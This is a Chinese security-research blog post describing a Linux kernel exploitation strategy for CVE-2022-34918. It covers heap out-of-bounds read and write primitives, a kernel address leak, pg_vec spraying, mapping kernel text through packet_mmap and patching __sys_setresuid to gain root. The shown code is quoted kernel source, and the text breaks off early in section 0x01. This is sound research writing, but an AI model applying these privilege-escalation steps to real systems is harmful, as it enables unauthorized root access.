<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="书接上回《CVE-2022-34918 netfilter 分析笔记》。 在上一篇文章中，我将360在blackhat asia 2022上提出的USMA利用方式实践于 CVE-2022-34918的利用过程中，取得了不错的利用效果，即绕过了内核诸多的防御措施。 但唯一的缺点是，上次的利用脚本需要攻击者预先知道内核中的目标函数偏移，而这往往是实际利用中最难获得的。这也正是DirtyCow，Dirt">
<meta property="og:type" content="article">
<meta property="og:title" content="基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践">
<meta property="og:url" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/index.html">
<meta property="og:site_name" content="veritas501&#39;s blog">
<meta property="og:description" content="书接上回《CVE-2022-34918 netfilter 分析笔记》。 在上一篇文章中，我将360在blackhat asia 2022上提出的USMA利用方式实践于 CVE-2022-34918的利用过程中，取得了不错的利用效果，即绕过了内核诸多的防御措施。 但唯一的缺点是，上次的利用脚本需要攻击者预先知道内核中的目标函数偏移，而这往往是实际利用中最难获得的。这也正是DirtyCow，Dirt">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813144408756.png">
<meta property="og:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813150743907.png">
<meta property="og:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220812000450869.png">
<meta property="og:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220812001321301.png">
<meta property="og:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220812151341023.png">
<meta property="og:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813152514021.png">
<meta property="og:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813152121943.png">
<meta property="og:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813161913120.png">
<meta property="article:published_time" content="2022-08-10T16:00:00.000Z">
<meta property="article:modified_time" content="2023-12-08T03:09:28.454Z">
<meta property="article:author" content="veritas501">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813144408756.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022_08_02-CVE-2022-34918%20netfilter%20%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&text=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&is_video=false&description=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践&body=Check out this article: https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&title=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&name=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/&t=基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E7%AE%80%E5%8D%95%E5%9B%9E%E9%A1%BE%E4%B8%8A%E6%AC%A1%E7%9A%84%E6%89%8B%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">0x00. 简单回顾上次的手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%96%B0%E6%9C%8B%E5%8F%8B-fs-context"><span class="toc-number">2.</span> <span class="toc-text">0x01. 新朋友 fs_context</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-ksymtab-make-shellcode-great-again"><span class="toc-number">3.</span> <span class="toc-text">0x02. ksymtab make shellcode great again</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03. 总结</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">veritas501</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-08-10T16:00:00.000Z" class="dt-published" itemprop="datePublished">2022-08-11</time>
        
        (Updated: <time datetime="2023-12-08T03:09:28.454Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/kernel/" rel="tag">kernel</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>书接上回<a href="https://veritas501.github.io/2022_08_02-CVE-2022-34918%20netfilter%20%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/">《CVE-2022-34918 netfilter 分析笔记》</a>。</p>
<p>在上一篇文章中，我将360在blackhat asia 2022上提出的USMA利用方式实践于 CVE-2022-34918的利用过程中，取得了不错的利用效果，即绕过了内核诸多的防御措施。</p>
<p>但唯一的缺点是，上次的利用脚本<strong>需要攻击者预先知道内核中的目标函数偏移</strong>，而这往往是实际利用中<strong>最难获得的</strong>。这也正是DirtyCow，DirtyPipe这些逻辑类漏洞相比于内存损坏类漏洞最大的优势。</p>
<p>这篇文章我们再以CVE-2022-34918为模板，尝试让USMA在利用过程中不再依赖内核中的地址偏移，从而内存损坏型漏洞的exp能够和逻辑类漏洞一样具有普适性。</p>
<h2 id="0x00-简单回顾上次的手法"><a href="#0x00-简单回顾上次的手法" class="headerlink" title="0x00. 简单回顾上次的手法"></a>0x00. 简单回顾上次的手法</h2><p>在上次的利用中，我们先通过漏洞本身提供的堆越界写原语去修改 struct user_key_payload 的 datalen 字段，从而使用keyctl syscall 从 data 中越界读取数据，得到了堆越界读原语。</p>
<p><img src="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813144408756.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>又由于使用 keyctl 的 KEYCTL_REVOKE 将 key 注销时，一个函数指针会被写到 struct user_key_payload 的 rcu.func 处，从而借助堆越界读原语 leak 出函数指针 user_free_payload_rcu ，再通过偏移计算出内核基地址，之后在通过偏移计算出目标函数 __sys_setresuid 的地址。</p>
<p><img src="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220813150743907.png"></p>
<p>之后通过反复调用 raw packets 的 set ring 逻辑，让其不断分配 pg_vec（Line 4287），从而堆喷 pg_vec。其中 alloc_one_pg_vec_page （Line 4292）的返回值为虚拟地址页，因此 pg_vec 其实就是一个满是虚拟地址的结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/packet/af_packet.c:3695</span></span><br><span class="line"><span class="comment">/* 3695 */</span> <span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="comment">/* 3696 */</span> packet_setsockopt(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">sockptr_t</span> optval,</span><br><span class="line"><span class="comment">/* 3697 */</span> 		  <span class="type">unsigned</span> <span class="type">int</span> optlen)</span><br><span class="line"><span class="comment">/* 3698 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3706 */</span> 	<span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3711 */</span> 		<span class="type">int</span> len = optlen;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3728 */</span> 	<span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line"><span class="comment">/* 3729 */</span> 	<span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line"><span class="comment">/* 3730 */</span> 	&#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3735 */</span> 		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 3740 */</span> 		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">------</span><br><span class="line">    					<span class="comment">// 调用</span></span><br><span class="line"><span class="comment">/* 3751 */</span> 				ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line"><span class="comment">/* 3752 */</span> 						    optname == PACKET_TX_RING);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/packet/af_packet.c:4306</span></span><br><span class="line"><span class="comment">/* 4306 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_set_ring</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span><br><span class="line"><span class="params"><span class="comment">/* 4307 */</span> 		<span class="type">int</span> closing, <span class="type">int</span> tx_ring)</span></span><br><span class="line"><span class="comment">/* 4308 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 4331 */</span> 	<span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 4376 */</span> 		order = get_order(req-&gt;tp_block_size);</span><br><span class="line">    			<span class="comment">// 调用</span></span><br><span class="line"><span class="comment">/* 4377 */</span> 		pg_vec = alloc_pg_vec(req, order);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/packet/af_packet.c:4281</span></span><br><span class="line"><span class="comment">/* 4281 */</span> <span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line"><span class="comment">/* 4282 */</span> &#123;</span><br><span class="line"><span class="comment">/* 4283 */</span> 	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 在slab中申请一段内存在存放pg_vec</span></span><br><span class="line"><span class="comment">/* 4287 */</span> 	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 申请 n 个 page</span></span><br><span class="line"><span class="comment">/* 4291 */</span> 	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line"><span class="comment">/* 4292 */</span> 		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br></pre></td></tr></table></figure>

<p>接着我们使用漏洞本身提供的堆越界写原语去修改 pg_vec 中的页到目标函数 __sys_setresuid 所在的页，再透过 packet_mmap 将这个页映射到用户态供用户读写，从而可以直接修改内核代码。</p>
<p>其中注意到在mmap时存在校验，即检查page是否为匿名页，是否为Slab子系统分配的页，以及page是否含有type。因此此处我们可以选择内核代码段作为目标对象，因为他满足所有校验。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; mm/memory.c:1752</span></span><br><span class="line"><span class="comment">/* 1752 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">validate_page_before_insert</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line"><span class="comment">/* 1753 */</span> &#123;</span><br><span class="line"><span class="comment">/* 1754 */</span> 	<span class="keyword">if</span> (PageAnon(page) || PageSlab(page) || page_has_type(page))</span><br><span class="line"><span class="comment">/* 1755 */</span> 		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">/* 1756 */</span> 	flush_dcache_page(page);</span><br><span class="line"><span class="comment">/* 1757 */</span> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 1758 */</span> &#125;</span><br></pre></td></tr></table></figure>

<p>之后我们patch掉 __sys_setresuid 中的某些校验，从而让任意用户都可以透过 setresuid syscall 来提升权限到root。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; kernel/sys.c:652</span></span><br><span class="line"><span class="comment">/* 652 */</span> <span class="type">long</span> __sys_setresuid(<span class="type">uid_t</span> ruid, <span class="type">uid_t</span> euid, <span class="type">uid_t</span> suid)</span><br><span class="line"><span class="comment">/* 653 */</span> &#123;</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// patch 这个判断</span></span><br><span class="line"><span class="comment">/* 680 */</span> 	<span class="keyword">if</span> (!ns_capable_setid(old-&gt;user_ns, CAP_SETUID)) &#123;</span><br><span class="line"><span class="comment">/* 681 */</span> 		<span class="keyword">if</span> (ruid != (<span class="type">uid_t</span>) <span class="number">-1</span>        &amp;&amp; !uid_eq(kruid, old-&gt;uid) &amp;&amp;</span><br><span class="line"><span class="comment">/* 682 */</span> 		    !uid_eq(kruid, old-&gt;euid) &amp;&amp; !uid_eq(kruid, old-&gt;suid))</span><br><span class="line"><span class="comment">/* 683 */</span> 			<span class="keyword">goto</span> error;</span><br><span class="line"><span class="comment">/* 684 */</span> 		<span class="keyword">if</span> (euid != (<span class="type">uid_t</span>) <span class="number">-1</span>        &amp;&amp; !uid_eq(keuid, old-&gt;uid) &amp;&amp;</span><br><span class="line"><span class="comment">/* 685 */</span> 		    !uid_eq(keuid, old-&gt;euid) &amp;&amp; !uid_eq(keuid, old-&gt;suid))</span><br><span class="line"><span class="comment">/* 686 */</span> 			<span class="keyword">goto</span> error;</span><br><span class="line"><span class="comment">/* 687 */</span> 		<span class="keyword">if</span> (suid != (<span class="type">uid_t</span>) <span class="number">-1</span>        &amp;&amp; !uid_eq(ksuid, old-&gt;uid) &amp;&amp;</span><br><span class="line"><span class="comment">/* 688 */</span> 		    !uid_eq(ksuid, old-&gt;euid) &amp;&amp; !uid_eq(ksuid, old-&gt;suid))</span><br><span class="line"><span class="comment">/* 689 */</span> 			<span class="keyword">goto</span> error;</span><br><span class="line"><span class="comment">/* 690 */</span> 	&#125;</span><br></pre></td></tr></table></figure>



<p>阅读过360 <a target="_blank" rel="noopener" href="https://vul.360.net/archives/391">USMA原文</a>的朋友应该已经发现了，后面使用USMA的方法和原文相比不能说是比较类似，只能说是完全一致（笑</p>
<p>这一方案（指patch setresuid）的优点是省劲（指leak出指针后通过偏移直接计算出目标地址），但缺点也同样明显，即通过偏移计算地址这种方式在实际利用中可遇不可求。</p>
<p>有无可能让USMA做到逻辑洞那样的普适性，在不需要知道内核的任何偏移的情况下完成利用呢？</p>
<p>下文便是我的思考的过程。</p>
<h2 id="0x01-新朋友-fs-context"><a href="#0x01-新朋友-fs-context" class="headerlink" title="0x01. 新朋友 fs_context"></a>0x01. 新朋友 fs_context</h2><p>在写出上一篇文章的exploit前， 通过rcu.func来泄露内核地址并不是我第一个想到的利用对象。</p>
